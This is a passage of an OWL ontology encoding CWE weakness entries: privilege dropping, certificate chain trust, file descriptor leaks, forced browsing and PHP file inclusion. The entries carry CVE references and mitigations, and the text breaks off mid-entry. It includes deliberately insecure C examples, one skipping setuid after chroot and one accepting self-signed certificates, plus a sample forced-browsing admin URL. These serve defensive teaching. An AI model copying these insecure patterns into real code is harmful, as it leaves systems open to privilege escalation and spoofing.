Prefix: : <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#>
Prefix: dc: <http://purl.org/dc/elements/1.1/>
Prefix: owl: <http://www.w3.org/2002/07/owl#>
Prefix: rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>
Prefix: rdfs: <http://www.w3.org/2000/01/rdf-schema#>
Prefix: xml: <http://www.w3.org/XML/1998/namespace>
Prefix: xsd: <http://www.w3.org/2001/XMLSchema#>



Ontology: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE>


Annotations: 
    rdfs:comment "CWE™ is a community-developed list of common software security weaknesses. It serves as a common language, a measuring stick for software security tools, and as a baseline for weakness identification, mitigation, and prevention efforts."^^xsd:string,
    rdfs:comment "Easily find a specific software weakness by performing a search of the CWE List by keywords(s) or by CWE-ID Number. To search by multiple keywords, separate each by a space."^^xsd:string

AnnotationProperty: rdfs:comment

    
Datatype: rdf:PlainLiteral

    
Datatype: xsd:positiveInteger

    
Datatype: xsd:string

    
ObjectProperty: categories_includes

    Domain: 
        Categories
    
    Range: 
        Bases or Classes or Compound or Variants
    
    
ObjectProperty: categories_member

    Characteristics: 
        Functional
    
    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        Categories
    
    
ObjectProperty: owl:topObjectProperty

    
ObjectProperty: references

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        CVEEntries
    
    
ObjectProperty: related_attack_patterns

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        CAPECEntries
    
    
ObjectProperty: views_includes

    SubPropertyOf: 
        owl:topObjectProperty
    
    Domain: 
        Views
    
    Range: 
        Categories
    
    
ObjectProperty: views_member

    Characteristics: 
        Functional
    
    Domain: 
        Bases or Categories or Classes or Compound or Variants
    
    Range: 
        Views
    
    
DataProperty: Black_Box

    SubPropertyOf: 
        detection_methods
    
    
DataProperty: ID

    Characteristics: 
        Functional
    
    Domain: 
        CWEEntries
    
    Range: 
        xsd:positiveInteger
    
    
DataProperty: access_control

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: accountability

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: applicable_platforms

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        xsd:string
    
    
DataProperty: architecture_and_design

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: architecture_or_design_review

    SubPropertyOf: 
        detection_methods
    
    
DataProperty: authentication

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: automated_analysis

    SubPropertyOf: 
        detection_methods
    
    
DataProperty: availability

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: build_and_compilation

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: class

    Range: 
        {"Interpreted" , "Language-Independent"}
    
    SubPropertyOf: 
        applicable_platforms
    
    
DataProperty: common_consequences

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        {"" , "Alter Execution Logic" , "Bypass Protection Mechanism" , "DoS: Crash, Exit, or Restart" , "DoS: Resource Consumption (CPU)" , "DoS: Resource Consumption (Memory)" , "DoS: Resource Consumption (Other)" , "Execute Unauthorized Code or Commands" , "Gain Privileges or Assume Identity" , "Hide Activities" , "Modify Application Data" , "Modify Files or Directories" , "Modify Memory" , "Other" , "Quality Degradation" , "Read Application Data" , "Read Files or Directories" , "Read Memory" , "Unexpected State" , "Varies by Context"}
    
    
DataProperty: confidentiality

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: demonstrative_examples

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        xsd:string
    
    
DataProperty: detection_methods

    Domain: 
        Bases or Classes or Compound or Variants
    
    
DataProperty: distribution

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: documentation

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: dynamic

    Range: 
        {"" , "automated" , "black box" , "manual"}
    
    SubPropertyOf: 
        detection_methods
    
    
DataProperty: fuzzing

    SubPropertyOf: 
        detection_methods
    
    
DataProperty: implementation

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: installation

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: integrity

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: languages

    Range: 
        {"ASP.NET" , "C" , "C#" , "C++" , "Java" , "JavaScript" , "PHP" , "Perl" , "Python" , "Ruby" , "XML"}
    
    SubPropertyOf: 
        applicable_platforms
    
    
DataProperty: likelihood_of_exploit

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        {"Default" , "High" , "Low" , "Medium" , "None" , "Not Applicable" , "Quantified" , "Unknown"}
    
    
DataProperty: manual_analysis

    SubPropertyOf: 
        detection_methods
    
    
DataProperty: modes_of_introduction

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        xsd:string
    
    SubPropertyOf: 
        owl:topDataProperty
    
    
DataProperty: non-repudiation

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: operating_system

    Range: 
        {"Unix" , "Windows" , "macOS"}
    
    SubPropertyOf: 
        applicable_platforms
    
    
DataProperty: operation

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: other

    SubPropertyOf: 
        common_consequences
    
    
DataProperty: owl:topDataProperty

    
DataProperty: paradigms

    Range: 
        {"Client Server" , "Mobile" , "Web Based"}
    
    SubPropertyOf: 
        applicable_platforms
    
    
DataProperty: policy

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: requirements

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: static

    Range: 
        {"" , "automated" , "manual"}
    
    SubPropertyOf: 
        detection_methods
    
    
DataProperty: system_configuration

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: technologies

    Range: 
        {"Database Server" , "Web Server"}
    
    SubPropertyOf: 
        applicable_platforms
    
    
DataProperty: testing

    SubPropertyOf: 
        modes_of_introduction
    
    
DataProperty: weakness_ordinalities

    Domain: 
        Bases or Classes or Compound or Variants
    
    Range: 
        {"Indirect" , "Primary" , "Resultant"}
    
    
Class: Bases

    SubClassOf: 
        CWEEntries
    
    
Class: CAPECEntries

    
Class: CVEEntries

    
Class: CWEEntries

    
Class: Categories

    SubClassOf: 
        CWEEntries
    
    
Class: Classes

    SubClassOf: 
        CWEEntries
    
    
Class: Compound

    SubClassOf: 
        CWEEntries
    
    
Class: Variants

    SubClassOf: 
        CWEEntries
    
    
Class: Views

    SubClassOf: 
        CWEEntries
    
    
Individual: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#CWE-271_Privilege_Dropping_/_Lowering_Errors>

    Annotations: 
        rdfs:comment "In some contexts, a system executing with elevated permissions will hand off a process/file/etc. to another process or user. If the privileges of an entity are not reduced, then elevated privileges are spread throughout a system and possibly to an attacker."^^xsd:string,
        rdfs:comment "The software does not drop privileges before passing control of a resource to an actor that does not have those privileges."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Finger daemon does not drop privileges when executing programs on behalf of the user being fingered."^^xsd:string
                 
                 references  CVE-1999-0813,
     
     Annotations: rdfs:comment "FTP server does not drop privileges if a connection is aborted during file transfer."^^xsd:string
                 
                 references  CVE-1999-1326,
     
     Annotations: rdfs:comment "Program only uses seteuid to drop privileges."^^xsd:string
                 
                 references  CVE-2000-0172,
     
     Annotations: rdfs:comment "Program does not drop privileges after acquiring the raw socket."^^xsd:string
                 
                 references  CVE-2000-1213,
     
     Annotations: rdfs:comment "Setuid program does not drop privileges after a parsing error occurs, then calls another program to handle the error."^^xsd:string
                 
                 references  CVE-2001-0559,
     
     Annotations: rdfs:comment "Does not drop privileges in related groups when lowering privileges."^^xsd:string
                 
                 references  CVE-2001-0787,
     
     Annotations: rdfs:comment "Does not drop privileges before determining access to certain files."^^xsd:string
                 
                 references  CVE-2001-1029,
     
     Annotations: rdfs:comment "Does not drop privileges in related groups when lowering privileges."^^xsd:string
                 
                 references  CVE-2002-0080,
     
     Annotations: rdfs:comment "Utility Manager launches winhlp32.exe while running with raised privileges, which allows local users to gain system privileges."^^xsd:string
                 
                 references  CVE-2004-0213,
     
     Annotations: rdfs:comment "Setuid program does not drop privileges before executing program specified in an environment variable."^^xsd:string
                 
                 references  CVE-2004-0806,
     
     Annotations: rdfs:comment "Setuid program does not drop privileges before processing file specified on command line."^^xsd:string
                 
                 references  CVE-2004-0828,
     
     Annotations: rdfs:comment "Service on Windows does not drop privileges before using \"view file\" option, allowing code execution."^^xsd:string
                 
                 references  CVE-2004-2070,
     
     Annotations: rdfs:comment "Windows program running as SYSTEM does not drop privileges before executing other programs (many others like this, especially involving the Help facility)."^^xsd:string
                 
                 references  CVE-2004-2504,
     ID  "271"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string, 
                 rdfs:comment "If privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 access_control  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.

Example Language: C  /* (bad code) */
chroot(APP_HOME);
chdir(\"/\");
FILE* data = fopen(argv[1], \"r+\");
...
Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#CWE-296_Improper_Following_of_a_Certificate's_Chain_of_Trust>

    Annotations: 
        rdfs:comment "If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.

In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.

There are several ways in which the chain of trust might be broken, including but not limited to:
- Any certificate in the chain is self-signed, unless it the root.
- Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.
- An intermediate, CA-signed certificate does not have the expected Basic Constraints or other important extensions.
- The root certificate has been compromised or authorized to the wrong party."^^xsd:string,
        rdfs:comment "The software does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     references  CVE-2002-0862,
     references  CVE-2002-0970,
     references  CVE-2008-4989,
     references  CVE-2009-0124,
     references  CVE-2009-0265,
     references  CVE-2009-3046,
     references  CVE-2012-5821,
     references  CVE-2016-2402,
     ID  "296"^^xsd:positiveInteger,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that proper certificate checking is included in the system design."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "This code checks the certificate of a connected peer.

Example Language: C  /* (bad code) */
if ((cert = SSL_get_peer_certificate(ssl)) && host)
foo=SSL_get_verify_result(ssl);

if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))

// certificate looks good, host can be trusted 
In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or conducting a man-in-the-middle attack."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the full chain of trust."^^xsd:string, 
                 rdfs:comment "Understand, and properly implement all checks necessary to ensure the integrity of certificate trust integrity."^^xsd:string, 
                 rdfs:comment "When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Exploitation of this flaw can lead to the trust of data that may have originated with a spoofed source."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string
    
    
Individual: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#CWE-403_Exposure_of_File_Descriptor_to_Unintended_Control_Sphere_/'File_Descriptor_Leak'/>

    Annotations: 
        rdfs:comment "A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors."^^xsd:string,
        rdfs:comment "Alternate Terms
File descriptor leak:	
While this issue is frequently called a file descriptor leak, the \"leak\" term is often used in two different ways - exposure of a resource, or consumption of a resource. Use of this term could cause confusion."^^xsd:string,
        rdfs:comment "When a new process is forked or executed, the child process inherits any open file descriptors. When the child process has fewer privileges than the parent process, this might introduce a vulnerability if the child process can access the file descriptor but does not have the privileges to access the associated file."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Access to restricted resource using modified file descriptor for stderr."^^xsd:string
                 
                 references  CVE-2000-0094,
     
     Annotations: rdfs:comment "Open file descriptor used as alternate channel in complex race condition."^^xsd:string
                 
                 references  CVE-2002-0638,
     
     Annotations: rdfs:comment "Program does not fully drop privileges after creating a file descriptor, which allows access to the descriptor via a separate vulnerability."^^xsd:string
                 
                 references  CVE-2003-0489,
     
     Annotations: rdfs:comment "Server leaks a privileged file descriptor, allowing the server to be hijacked."^^xsd:string
                 
                 references  CVE-2003-0740,
     
     Annotations: rdfs:comment "User bypasses restrictions by obtaining a file descriptor then calling setuid program, which does not close the descriptor."^^xsd:string
                 
                 references  CVE-2003-0937,
     
     Annotations: rdfs:comment "File descriptor leak allows read of restricted files."^^xsd:string
                 
                 references  CVE-2004-1033,
     
     Annotations: rdfs:comment "Terminal manager does not properly close file descriptors, allowing attackers to access terminals of other users."^^xsd:string
                 
                 references  CVE-2004-2215,
     
     Annotations: rdfs:comment "Module opens a file for reading twice, allowing attackers to read files."^^xsd:string
                 
                 references  CVE-2006-5397,
     ID  "403"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#CWE-425_Direct_Request_/'Forced_Browsing'/>

    Annotations: 
        rdfs:comment "Relationship
Overlaps Modification of Assumed-Immutable Data (MAID), authorization errors, container errors; often primary to other weaknesses such as XSS and SQL injection."^^xsd:string,
        rdfs:comment "The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files."^^xsd:string,
        rdfs:comment "Theoretical
\"Forced browsing\" is a step-based manipulation involving the omission of one or more steps, whose order is assumed to be immutable. The application does not verify that the first step was performed successfully before the second step. The consequence is typically \"authentication bypass\" or \"path disclosure,\" although it can be primary to all kinds of weaknesses, especially in languages such as PHP, which allow external modification of assumed-immutable variables."^^xsd:string,
        rdfs:comment "Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Upload arbitrary files via direct request."^^xsd:string
                 
                 references  CVE-2002-1798,
     
     Annotations: rdfs:comment "Bypass authentication via direct request."^^xsd:string
                 
                 references  CVE-2004-2144,
     
     Annotations: rdfs:comment "Bypass auth/auth via direct request."^^xsd:string
                 
                 references  CVE-2004-2257,
     
     Annotations: rdfs:comment "Authorization bypass using direct request."^^xsd:string
                 
                 references  CVE-2005-1654,
     
     Annotations: rdfs:comment "Access privileged functionality using direct request."^^xsd:string
                 
                 references  CVE-2005-1668,
     
     Annotations: rdfs:comment "Authentication bypass via direct request."^^xsd:string
                 
                 references  CVE-2005-1685,
     
     Annotations: rdfs:comment "Direct request leads to infoleak by error."^^xsd:string
                 
                 references  CVE-2005-1688,
     
     Annotations: rdfs:comment "Direct request leads to infoleak by error."^^xsd:string
                 
                 references  CVE-2005-1697,
     
     Annotations: rdfs:comment "Direct request leads to infoleak by error."^^xsd:string
                 
                 references  CVE-2005-1698,
     
     Annotations: rdfs:comment "Authentication bypass via direct request."^^xsd:string
                 
                 references  CVE-2005-1827,
     
     Annotations: rdfs:comment "Infinite loop or infoleak triggered by direct requests."^^xsd:string
                 
                 references  CVE-2005-1892,
     
     Annotations: rdfs:comment "Directory Indexing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-127,
     
     Annotations: rdfs:comment "Forceful Browsing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-87,
     ID  "425"^^xsd:positiveInteger,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Apply appropriate access control authorizations for each access to all restricted URLs, scripts or files."^^xsd:string, 
                 rdfs:comment "Consider using MVC based frameworks such as Struts."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
If forced browsing is possible, an attacker may be able to directly access a sensitive page by entering a URL similar to the following.

Example Language: JSP /* (attack code) */
http://somesite.com/someapplication/admin.jsp"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Apply appropriate access control authorizations for each access to all restricted URLs, scripts or files."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: <http://www.semanticweb.org/Zh/ontologies/2018/6/CWE#CWE-98_Improper_Control_of_Filename_for_Include/Require_Statement_in_PHP_Program>

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Alternate Terms
Remote file include	
RFI: The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers.
Local file inclusion: This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs."^^xsd:string,
        rdfs:comment "In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the software will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP."^^xsd:string,
        rdfs:comment "Relationship:
This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.

Can overlap directory traversal in local inclusion problems."^^xsd:string,
        rdfs:comment "Research Gap:
Under-researched and under-reported. Other interpreted languages with \"require\" and \"include\" functionality could also product vulnerable applications, but as of 2007, PHP has been the focus. Any web-accessible language that uses executable file extensions is likely to have this type of issue, such as ASP, since .asp extensions are typically executable. Languages such as Perl are less likely to exhibit these problems because the .pl extension isn't always configured to be executable by the web server."^^xsd:string,
        rdfs:comment "The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in \"require,\" \"include,\" or similar functions."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     related_attack_patterns  CAPEC-193,
     ID  "98"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.
This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
For example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers."^^xsd:string, 
